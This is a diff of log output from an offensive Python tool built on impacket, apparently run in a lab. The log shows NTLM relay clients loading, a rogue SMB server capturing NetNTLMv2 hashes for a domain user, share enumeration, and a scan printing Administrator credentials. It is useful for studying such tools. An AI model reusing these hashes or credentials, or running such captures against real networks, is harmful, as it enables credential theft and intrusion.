@@ -1,182 +1,115 @@
-2021-10-18 10:07:11.441 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-18 10:08:14.128 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-18 10:08:14.210 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMTP loaded..
-2021-10-18 10:08:14.226 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMB loaded..
-2021-10-18 10:08:14.276 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client DCSYNC loaded..
-2021-10-18 10:08:14.278 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAP loaded..
-2021-10-18 10:08:14.278 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAPS loaded..
-2021-10-18 10:08:14.282 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client MSSQL loaded..
-2021-10-18 10:08:14.314 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAPS loaded..
-2021-10-18 10:08:14.314 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAP loaded..
-2021-10-18 10:08:14.315 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTP loaded..
-2021-10-18 10:08:14.315 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTPS loaded..
-2021-10-18 10:08:14.316 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client RPC loaded..
-2021-10-18 10:08:14.403 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
-2021-10-18 10:13:58.444 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-18 10:13:58.563 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMTP loaded..
-2021-10-18 10:13:58.595 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMB loaded..
-2021-10-18 10:13:58.665 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client DCSYNC loaded..
-2021-10-18 10:13:58.669 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAPS loaded..
-2021-10-18 10:13:58.670 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAP loaded..
-2021-10-18 10:13:58.681 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client MSSQL loaded..
-2021-10-18 10:13:58.733 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAP loaded..
-2021-10-18 10:13:58.734 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAPS loaded..
-2021-10-18 10:13:58.736 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTPS loaded..
-2021-10-18 10:13:58.737 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTP loaded..
-2021-10-18 10:13:58.739 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client RPC loaded..
-2021-10-18 10:13:58.930 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
-2021-10-18 10:14:57.162 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-18 10:15:27.169 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-18 10:15:27.273 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMTP loaded..
-2021-10-18 10:15:27.275 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMTP loaded..
-2021-10-18 10:15:27.293 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMB loaded..
-2021-10-18 10:15:27.294 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMB loaded..
-2021-10-18 10:15:27.349 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client DCSYNC loaded..
-2021-10-18 10:15:27.350 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client DCSYNC loaded..
-2021-10-18 10:15:27.353 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAPS loaded..
-2021-10-18 10:15:27.353 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAPS loaded..
-2021-10-18 10:15:27.354 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAP loaded..
-2021-10-18 10:15:27.354 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAP loaded..
-2021-10-18 10:15:27.358 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client MSSQL loaded..
-2021-10-18 10:15:27.358 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client MSSQL loaded..
-2021-10-18 10:15:27.392 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAPS loaded..
-2021-10-18 10:15:27.392 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAPS loaded..
-2021-10-18 10:15:27.392 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAP loaded..
-2021-10-18 10:15:27.392 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAP loaded..
-2021-10-18 10:15:27.393 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTP loaded..
-2021-10-18 10:15:27.393 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTP loaded..
-2021-10-18 10:15:27.393 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTPS loaded..
-2021-10-18 10:15:27.393 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTPS loaded..
-2021-10-18 10:15:27.396 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client RPC loaded..
-2021-10-18 10:15:27.396 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client RPC loaded..
-2021-10-18 10:15:27.485 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
-2021-10-18 10:15:27.485 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
-2021-10-19 09:54:50.767 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 09:55:36.223 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 09:55:38.260 | INFO     | impacket.smbserver:log:4132 - Config file parsed
-2021-10-19 09:55:38.264 | INFO     | impacket.smbserver:log:4132 - Config file parsed
-2021-10-19 09:55:56.706 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60153)
-2021-10-19 09:55:56.707 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60153)
-2021-10-19 09:55:57.030 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 09:55:57.033 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 09:55:57.033 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 09:55:57.037 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 09:55:57.037 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:12345678abcdef00:f14dc6246687f24c7ff9ad4b478588c1:0101000000000000005ea782cfc4d70121ce225d8ae0afdf000000000100100042005400470070004f0049004a0075000300100042005400470070004f0049004a0075000200100073004300650049006d004900790079000400100073004300650049006d0049007900790007000800005ea782cfc4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
-2021-10-19 09:55:57.038 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:12345678abcdef00:f14dc6246687f24c7ff9ad4b478588c1:0101000000000000005ea782cfc4d70121ce225d8ae0afdf000000000100100042005400470070004f0049004a0075000300100042005400470070004f0049004a0075000200100073004300650049006d004900790079000400100073004300650049006d0049007900790007000800005ea782cfc4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
-2021-10-19 09:55:57.088 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
-2021-10-19 09:55:57.088 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
-2021-10-19 09:55:57.162 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
-2021-10-19 09:55:57.163 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
-2021-10-19 09:55:57.426 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 09:55:57.427 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:19:34.896 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 10:19:42.577 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60210)
-2021-10-19 10:19:42.580 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,60210)
-2021-10-19 10:19:42.615 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 10:19:42.615 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 10:19:42.616 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 10:19:42.625 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 10:19:42.626 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2a7094fa0ed84ced4cc777d871a89add:010100000000000000b39dd4d2c4d70130a32cd16806a52f000000000100100074006c007200680069004c00580079000300100074006c007200680069004c0058007900020010005000470059005a0076004b0070004400040010005000470059005a0076004b00700044000700080000b39dd4d2c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001c0063006900660073002f006c0065006c002e006c006f00630061006c000000000000000000
-2021-10-19 10:19:42.626 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2a7094fa0ed84ced4cc777d871a89add:010100000000000000b39dd4d2c4d70130a32cd16806a52f000000000100100074006c007200680069004c00580079000300100074006c007200680069004c0058007900020010005000470059005a0076004b0070004400040010005000470059005a0076004b00700044000700080000b39dd4d2c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001c0063006900660073002f006c0065006c002e006c006f00630061006c000000000000000000
-2021-10-19 10:19:42.645 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
-2021-10-19 10:19:42.647 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
-2021-10-19 10:19:42.663 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
-2021-10-19 10:19:42.665 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
-2021-10-19 10:19:42.776 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:19:42.777 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:19:53.285 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
-2021-10-19 10:19:53.290 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
-2021-10-19 10:19:53.298 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,60210)
-2021-10-19 10:19:53.303 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,60210)
-2021-10-19 10:19:53.303 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
-2021-10-19 10:19:53.307 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
-2021-10-19 10:25:34.254 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 10:25:38.746 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57802)
-2021-10-19 10:25:38.749 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57802)
-2021-10-19 10:25:38.772 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 10:25:38.773 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 10:25:38.774 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 10:25:38.774 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 10:25:38.775 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:7811f62ea9e68f32285ea35c436303c5:010100000000000000fdcea8d3c4d701f185ba3471c2e51e000000000100100072004200550055007600480071007900030010007200420055005500760048007100790002001000440057006e0044004b0075005700580004001000440057006e0044004b007500570058000700080000fdcea8d3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001c0063006900660073002f006c0065006c002e006c006f00630061006c000000000000000000
-2021-10-19 10:25:38.776 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:7811f62ea9e68f32285ea35c436303c5:010100000000000000fdcea8d3c4d701f185ba3471c2e51e000000000100100072004200550055007600480071007900030010007200420055005500760048007100790002001000440057006e0044004b0075005700580004001000440057006e0044004b007500570058000700080000fdcea8d3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a0010000000000000000000000000000000000009001c0063006900660073002f006c0065006c002e006c006f00630061006c000000000000000000
-2021-10-19 10:25:38.797 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:25:38.799 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:25:39.008 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:25:39.010 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:25:46.576 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57803)
-2021-10-19 10:25:46.580 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57803)
-2021-10-19 10:25:46.611 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 10:25:46.613 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 10:25:46.617 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 10:25:46.618 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 10:25:46.621 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:308091aae47fb8e5729d0e737a264ab1:010100000000000000b193add3c4d70186d6a3aee17c2f05000000000100100072004200550055007600480071007900030010007200420055005500760048007100790002001000440057006e0044004b0075005700580004001000440057006e0044004b007500570058000700080000b193add3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
-2021-10-19 10:25:46.622 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:308091aae47fb8e5729d0e737a264ab1:010100000000000000b193add3c4d70186d6a3aee17c2f05000000000100100072004200550055007600480071007900030010007200420055005500760048007100790002001000440057006e0044004b0075005700580004001000440057006e0044004b007500570058000700080000b193add3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
-2021-10-19 10:25:46.648 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
-2021-10-19 10:25:46.648 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
-2021-10-19 10:25:46.665 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
-2021-10-19 10:25:46.665 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
-2021-10-19 10:25:46.708 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:25:46.709 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:25:49.507 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
-2021-10-19 10:25:49.509 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
-2021-10-19 10:25:49.518 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57802)
-2021-10-19 10:25:49.519 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57802)
-2021-10-19 10:25:49.520 | INFO     | impacket.smbserver:log:4132 - Remaining connections ['Thread-8']
-2021-10-19 10:25:49.521 | INFO     | impacket.smbserver:log:4132 - Remaining connections ['Thread-8']
-2021-10-19 10:26:00.245 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
-2021-10-19 10:26:00.245 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
-2021-10-19 10:26:00.247 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57803)
-2021-10-19 10:26:00.248 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57803)
-2021-10-19 10:26:00.248 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
-2021-10-19 10:26:00.248 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
-2021-10-19 10:26:21.553 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 10:26:21.555 | INFO     | project.smb.scan:__show_user_passwd:186 - [31mUSER -> [39m[34mAdministrator[39m
-2021-10-19 10:26:21.556 | INFO     | project.smb.scan:__show_user_passwd:189 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
-2021-10-19 10:26:21.556 | INFO     | project.smb.scan:__synchronous_way:527 - Using synchronous scan
-2021-10-19 10:26:21.559 | INFO     | project.smb.scan:__set_up_scan_actions_synchronous:499 - Starting to launch threads based on your cpu
-2021-10-19 10:26:59.393 | WARNING  | project.smb.scan:__set_up_scan_actions_synchronous:517 - 
+2021-10-20 15:24:38.556 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 15:24:44.384 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,63752)
+2021-10-20 15:24:44.415 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-20 15:24:44.416 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-20 15:24:44.418 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:dc8c22ded3fd5b0d9a4c612311cebaad:01010000000000000006df9bc6c5d701a09c17c06e5c8f5f000000000100100049007500610074006d006800430041000300100049007500610074006d0068004300410002001000550077004e006c004d006f004a00720004001000550077004e006c004d006f004a007200070008000006df9bc6c5d70106000400020000000800300030000000000000000000000000200000e0827650888adf25a147ceca46a18187a24acadd455b897bc746a69fbe5ccf910a0010000000000000000000000000000000000009001a0063006900660073002f00640064002e006c006f00630061006c000000000000000000
+2021-10-20 15:24:44.442 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-20 15:25:57.710 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 15:26:22.796 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,63754)
+2021-10-20 15:26:22.826 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-10-20 15:26:22.827 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-10-20 15:26:22.828 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:c2f2ba9a9a6200026b5d86f08f379160:010100000000000000a348d6c6c5d701ae8638bfe2c8e83900000000010010006800710051004b004b0043006e004600030010006800710051004b004b0043006e004600020010005100570076004100520049005a004400040010005100570076004100520049005a0044000700080000a348d6c6c5d70106000400020000000800300030000000000000000000000000200000e0827650888adf25a147ceca46a18187a24acadd455b897bc746a69fbe5ccf910a001000000000000000000000000000000000000900200063006900660073002f0070006500720072006f002e006c006f00630061006c000000000000000000
+2021-10-20 15:26:22.849 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-20 15:26:22.868 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-20 15:26:22.913 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-20 15:27:03.308 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
+2021-10-20 15:27:03.311 | INFO     | project.smb.scan:__show_user_passwd:186 - [31mUSER -> [39m[34mAdministrator[39m
+2021-10-20 15:27:03.315 | INFO     | project.smb.scan:__show_user_passwd:189 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2021-10-20 15:27:03.317 | INFO     | project.smb.scan:__synchronous_way:527 - Using synchronous scan
+2021-10-20 15:27:03.324 | INFO     | project.smb.scan:__set_up_scan_actions_synchronous:499 - Starting to launch threads based on your cpu
+2021-10-20 15:27:29.457 | WARNING  | project.smb.scan:__set_up_scan_actions_synchronous:517 - 
 Exiting ...
-2021-10-19 10:26:59.413 | SUCCESS  | project.smb.scan:__set_up_scan_actions_synchronous:520 - Synchronous scanning has been completed
-2021-10-19 10:27:54.792 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 10:28:00.484 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57805)
-2021-10-19 10:28:00.486 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57805)
-2021-10-19 10:28:00.498 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 10:28:00.499 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 10:28:00.500 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 10:28:00.501 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 10:28:00.502 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:1ab1aebc4aa86d52c95fee1d358098ec:0101000000000000007872fdd3c4d701438dd07d79ea6290000000000100100054004b0044006f005500760073006a000300100054004b0044006f005500760073006a0002001000470066006400740041006b004700640004001000470066006400740041006b004700640007000800007872fdd3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
-2021-10-19 10:28:00.504 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:1ab1aebc4aa86d52c95fee1d358098ec:0101000000000000007872fdd3c4d701438dd07d79ea6290000000000100100054004b0044006f005500760073006a000300100054004b0044006f005500760073006a0002001000470066006400740041006b004700640004001000470066006400740041006b004700640007000800007872fdd3c4d70106000400020000000800300030000000000000000000000000200000202ad5c0bc2cfe95eca67e97b26d8c954efd724285e1fc8641e6eff9a5b2ae280a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
-2021-10-19 10:28:00.529 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:28:00.529 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:28:00.777 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:28:00.777 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
-2021-10-19 10:28:15.050 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
-2021-10-19 10:28:15.051 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
-2021-10-19 10:28:15.058 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57805)
-2021-10-19 10:28:15.059 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,57805)
-2021-10-19 10:28:15.060 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
-2021-10-19 10:28:15.060 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
-2021-10-19 10:30:22.410 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 10:58:08.501 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 10:58:45.688 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 11:11:46.608 | INFO     | project.igris:check_settable_variables_value:198 - Checking the correct value of the necessary settable variables 
-2021-10-19 11:11:59.272 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57413)
-2021-10-19 11:11:59.274 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,57413)
-2021-10-19 11:11:59.302 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 11:11:59.302 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
-2021-10-19 11:11:59.303 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 11:11:59.303 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
-2021-10-19 11:11:59.303 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:a49fcad298cee14f30630f1dc34bc451:010100000000000080e96922dac4d7019be6993a0e64c94f00000000010010004d0057004f004f004900730078007300030010004d0057004f004f004900730078007300020010005600440043006300460044004600410004001000560044004300630046004400460041000700080080e96922dac4d701060004000200000008003000300000000000000000000000002000000d9770a5318a3568501369de2cedd069cd8dc04c388af4150fd98c2fd99f447b0a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
-2021-10-19 11:11:59.304 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:a49fcad298cee14f30630f1dc34bc451:010100000000000080e96922dac4d7019be6993a0e64c94f00000000010010004d0057004f004f004900730078007300030010004d0057004f004f004900730078007300020010005600440043006300460044004600410004001000560044004300630046004400460041000700080080e96922dac4d701060004000200000008003000300000000000000000000000002000000d9770a5318a3568501369de2cedd069cd8dc04c388af4150fd98c2fd99f447b0a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
-2021-10-19 11:11:59.333 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
-2021-10-19 11:11:59.334 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
